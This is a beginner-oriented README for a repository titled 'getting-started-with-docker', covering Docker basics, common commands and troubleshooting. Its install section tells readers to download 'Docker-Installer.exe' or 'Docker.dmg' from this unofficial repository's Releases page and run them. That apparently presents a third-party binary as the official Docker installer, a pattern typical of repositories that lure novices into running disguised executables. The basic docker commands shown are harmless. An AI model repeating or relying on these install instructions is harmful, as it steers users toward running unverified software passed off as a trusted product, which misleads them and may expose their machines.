## 📚 Introduction
Welcome to "getting-started-with-docker." This application helps you understand Docker, a tool that simplifies application development by using containers. With Docker, you can easily manage and deploy your applications in a consistent environment. This guide will take you through the process of downloading and running the software without needing any programming knowledge.

## 🚀 Getting Started
To get started with Docker, follow these simple steps:

1. **Understand What Docker Is**: Docker allows you to create, deploy, and run applications in containers. Imagine containers as boxes where your applications live. This makes it easier to install software and share it across different machines.

2. **Why Use Docker?**: Docker saves time by allowing you to develop on your local machine and deploy on servers with minimal changes.

## 💻 System Requirements
Before you begin, check that your system meets these requirements:

- **Operating System**: Windows 10 64-bit, macOS, or a recent version of Linux.
- **Memory**: At least 4GB of RAM.
- **Disk Space**: Minimum 10GB of free space for Docker and your projects.
- **Internet Connection**: Needed to download Docker and its dependencies.

## 🌐 Download & Install
To download Docker, you can visit the Releases page. Here’s how:

1. Click the link below to go to the download page:
   [Download Docker Releases](https://github.com/partiuplanoa/getting-started-with-docker/releases)

2. On the Releases page, look for the latest version. Download the appropriate file for your operating system. For example:
   - Windows: `Docker-Installer.exe`
   - macOS: `Docker.dmg`
   - Linux: follow specific installation instructions.

3. Once downloaded, find the file in your downloads directory. Double-click the file to start the installation.

4. Follow the on-screen instructions to complete the installation. This usually involves clicking "Next" several times and accepting the terms of service.

5. After installation, launch Docker from your applications menu.

## 🤖 Create Your First Docker Project
Once Docker is installed, you can start creating your first Docker project. 

1. **Open Docker**: Launch the Docker application you just installed.

2. **Prepare Your Workspace**: Create a folder on your desktop named "DockerProjects." This folder will hold all your Docker files.

3. **Download a Sample Project**:
   - Visit the Releases page again: [Download Docker Releases](https://github.com/partiuplanoa/getting-started-with-docker/releases).
   - Select a Docker sample project and download it to your "DockerProjects" folder.

4. **Run the Project**:
   - Open your terminal or command prompt.
   - Navigate to your "DockerProjects" folder using the command:

     ```bash
     cd path/to/DockerProjects
     ```

   - Once inside the folder, run the following command to start your container:

     ```bash
     docker-compose up
     ```

## 🔍 Monitoring Your Containers
After running your project, you may want to monitor how your containers are performing.

1. Go back to your terminal or command prompt.
2. Use the command:

   ```bash
   docker ps
   ```

   This command shows you the running containers and their status.

## ⚙️ Basic Docker Commands
Here are some basic commands you may find useful as you get started:

- **List Containers**: See all running containers with `docker ps`.
- **Stop a Container**: Use `docker stop <container_id>` to stop a running container.
- **Remove a Container**: If you want to delete a container, run `docker rm <container_id>`.
- **Pull an Image**: Download a Docker image using `docker pull <image_name>`.

## 🤔 Common Issues & Troubleshooting
While using Docker, you may come across some common issues. Here are a few tips:

- **Docker Won't Start**: Ensure that virtualization is enabled in your BIOS settings.
- **Cannot Access Docker from Command Line**: Make sure that Docker is added to your system's PATH environment variable.

## 📞 Support
If you have any questions or face issues while using Docker, feel free to reach out for support. You can open an issue in the GitHub repository, and someone will assist you.

## 📅 Next Steps
Once you have mastered the basics, consider exploring advanced topics such as:

- Building your own Docker images.
- Learning about Docker Compose for managing multi-container applications.
- Exploring Kubernetes for orchestration.

Docker is a powerful tool that can significantly improve your development workflow. Enjoy your journey into containerization!
